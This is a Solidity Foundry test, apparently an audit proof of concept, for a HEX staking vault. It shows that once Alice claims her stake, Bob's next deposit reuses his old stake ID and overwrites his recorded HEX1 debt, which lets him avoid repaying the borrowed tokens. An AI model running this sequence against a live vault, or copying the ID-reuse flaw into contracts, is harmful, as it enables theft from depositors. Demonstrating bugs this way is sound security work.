// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VaultBase.t.sol";

contract VaultOverlappingStakeIds is VaultBase {
    uint256 public constant ALICE_HEX_AMOUNT = 2000e8;
    uint256 public constant BOB_HEX_AMOUNT = 1000e8;
    uint256 public constant MIN_DURATION_SECONDS = 3652 days;
    uint16 public constant MIN_DURATION_DAYS = 3652;

    address public alice = makeAddr("Alice");
    address public bob = makeAddr("Bob");

    function setUp() public override {
        super.setUp();

        // enable the vault
        vm.prank(bootstrap);
        vault.setSacrificeStatus();

        assertEq(vault.sacrificeFinished(), true);

        // mint HEX to the users
        hexToken.mint(alice, ALICE_HEX_AMOUNT);
        hexToken.mint(bob, BOB_HEX_AMOUNT);

        assertEq(IERC20(address(hexToken)).balanceOf(alice), ALICE_HEX_AMOUNT);
        assertEq(IERC20(address(hexToken)).balanceOf(bob), BOB_HEX_AMOUNT);

        // alice approves the vault to spend HEX
        vm.prank(alice);
        IERC20(address(hexToken)).approve(address(vault), ALICE_HEX_AMOUNT);

        // bob approves the vault to spend HEX
        vm.prank(bob);
        IERC20(address(hexToken)).approve(address(vault), BOB_HEX_AMOUNT);
    }

    function test_vault_overlappingStakeIds() public {
        // alice deposits in the vault, stakeId = 0 (stakeCount == 1)
        vm.prank(alice);
        (uint256 aliceHex1Borrowed, uint256 aliceStakeId) = vault.deposit(ALICE_HEX_AMOUNT, MIN_DURATION_DAYS);

        assertEq(aliceStakeId, 0);
        assertEq(hexToken.stakeCount(address(vault)), 1);

        // bob deposits in the vault, stakeId = 1 (stakeCount == 2)
        vm.prank(bob);
        (uint256 bobHex1BorrowedBefore, uint256 bobStakeIdBefore) =
            vault.deposit(BOB_HEX_AMOUNT - 1e8, MIN_DURATION_DAYS);

        assertEq(bobStakeIdBefore, 1);
        assertEq(hexToken.stakeCount(address(vault)), 2);

        // advance block.timestamp so that the HEX stakes are mature
        skip(MIN_DURATION_SECONDS);

        // alice claims its stake and reedems it's HEX + yield by repaying the borrowed HEX1 (stakeCount == 1)
        vm.startPrank(alice);
        hex1.approve(address(vault), aliceHex1Borrowed);
        vault.claim(aliceStakeId);
        vm.stopPrank();

        assertEq(hexToken.stakeCount(address(vault)), 1);

        // bob deposits 1 HEX in the vault so his new stake overlaps the old one, stakeId = 1 (stakeCount == 2)
        vm.prank(bob);
        (uint256 bobHex1BorrowedAfter, uint256 bobStakeIdAfter) = vault.deposit(1e8, MIN_DURATION_DAYS);

        assertEq(bobStakeIdBefore, 1);
        assertEq(bobStakeIdAfter, bobStakeIdBefore);
        assertEq(hexToken.stakeCount(address(vault)), 2);

        // bob is able replace the information of is first deposit with the information of the second one
        // since they have the same stake id, allowing him to avoid paying back the HEX1 borrowed.
        assertGt(bobHex1BorrowedBefore, bobHex1BorrowedAfter);

        console.log("amount of HEX1 borrowed for stake id 1:            ", bobHex1BorrowedBefore);
        console.log("overridden amount of HEX1 borrowed for stake id 1: ", bobHex1BorrowedAfter);
    }
}
